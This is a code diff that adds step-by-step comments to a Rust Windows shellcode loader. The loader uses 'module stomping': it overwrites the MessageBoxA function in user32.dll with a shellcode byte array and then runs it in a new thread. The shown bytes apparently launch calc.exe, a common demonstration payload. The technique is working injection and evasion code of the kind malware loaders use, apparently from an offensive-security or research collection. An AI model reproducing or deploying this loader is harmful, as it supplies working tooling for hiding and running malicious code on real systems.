@@ -31,11 +31,14 @@ fn main() -> Result<()> {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
     unsafe {
+        // Load the user32.dll library into the process to find a valid function to overwrite
         let h_module = LoadLibraryA(s!("user32"))?;
 
+        // Retrieve the memory address of MessageBoxA, the target function to stomp
         let func = GetProcAddress(h_module, s!("MessageBoxA")).ok_or_else(|| Error::from_win32())?
             as *const u8;
 
+        // Change memory protection to writable (PAGE_READWRITE) to allow overwriting the function
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(
             func.cast(),
@@ -44,8 +47,10 @@ fn main() -> Result<()> {
             &mut oldprotect,
         )?;
 
+        // Overwrite the MessageBoxA function with the shellcode
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func.cast_mut(), shellcode.len());
 
+        // Restore memory protection to executable/readable (PAGE_EXECUTE_READ) after injection.
         VirtualProtect(
             func.cast(),
             shellcode.len(),
@@ -53,6 +58,7 @@ fn main() -> Result<()> {
             &mut oldprotect,
         )?;
 
+        // Create a new thread that starts execution at the injected shellcode
         let hthread = CreateThread(
             None,
             0,
